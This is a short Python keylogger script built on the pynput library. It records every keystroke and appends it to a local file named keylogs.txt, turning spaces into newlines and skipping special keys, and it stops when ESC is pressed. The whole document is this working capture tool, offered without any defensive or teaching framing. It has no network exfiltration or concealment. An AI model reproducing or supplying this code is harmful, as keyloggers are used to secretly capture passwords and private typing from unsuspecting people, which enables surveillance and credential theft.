#!/usr/bin/env python3

from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    keys.append(key)
    write_to_file(keys)

def write_to_file(keys):
    with open("keylogs.txt", "a") as f:  # "a" appends instead of overwriting
        for key in keys:
            k = str(key).replace("'", "")
            if k == "Key.space":
                f.write("\n")  # Write a newline for space
            elif "Key" not in k:  
                f.write(k)  # Write only actual keys
        keys.clear()  # Clear the list to avoid duplicates

def on_release(key):
    if key == Key.esc:
        return False  # Stop when ESC is pressed

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
